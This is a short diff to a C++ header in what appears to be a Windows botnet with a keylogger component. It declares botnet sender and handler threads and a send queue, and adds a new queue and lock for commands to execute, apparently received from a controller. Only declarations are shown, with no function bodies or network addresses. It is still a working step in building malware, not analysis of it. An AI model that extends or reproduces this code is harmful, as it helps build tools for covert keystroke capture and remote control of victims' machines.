@@ -10,10 +10,12 @@
 DWORD WINAPI senderBotnetThread(LPVOID lpParam);
 DWORD handle_botnet(LPVOID lpParam);
 void EnqueueSend(const std::string& s);
-bool HandleExec();
+void EnqueueExecute(const std::string& s);
 
-inline int packet_number = 0;
+// Use packetNumber from KeyLogger.h for consistency
 inline std::queue<std::string> send_queue;
 inline std::mutex queue_mutex;
+inline std::queue<std::string> execute_queue;
+inline std::mutex execute_mutex;
 inline bool should_stop_sender = false;
 constexpr int max_len = 60;
